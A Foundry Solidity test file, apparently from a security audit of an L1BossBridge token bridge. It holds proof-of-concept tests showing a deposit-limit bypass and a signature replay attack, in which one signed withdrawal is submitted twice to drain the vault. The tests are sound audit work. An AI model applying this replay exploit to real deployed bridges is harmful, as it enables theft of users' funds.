// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";

contract AuditTest is Test {
     event Deposit(address from, address to, uint256 amount);

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address user1 = makeAddr("user1");
    address userInL2 = makeAddr("userInL2");
    Account operator = makeAccount("operator");

    uint8 v_copy;
    bytes32 r_copy;
    bytes32 s_copy;

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 200000e18);

        token.transfer(address(user1), 1000e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    function testDepositLimit() public {
        vm.startPrank(user);
        token.transfer(address(vault),200000e18);
        vm.stopPrank();

        console2.log("Balance of the tokenVault",token.balanceOf(address(vault))/1e18);
        console2.log("Deposit Limit",tokenBridge.DEPOSIT_LIMIT()/1e18);

       
    }

    function testReplayAttack() public {
        uint256 depositAmount = 100e18;

        vm.startPrank(user);
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        vm.stopPrank();

        vm.startPrank(user1);
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user1, userInL2, depositAmount);
        vm.stopPrank();
        
        console2.log("Balance of the vault before the replay Attack",token.balanceOf(address(vault))/1e18);
        vm.startPrank(user);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
        console2.log("Balance of the user after replay Attack",token.balanceOf(address(user)));
        console2.log("Balance of the vault after the replay Attack",token.balanceOf(address(vault)));
        vm.stopPrank();

    }






     function _signMessage(
        bytes memory message,
        uint256 privateKey
    )
        private
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
    }

    function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
        return abi.encode(
            address(token), // target
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), recipient, amount)) // data
        );
    }

}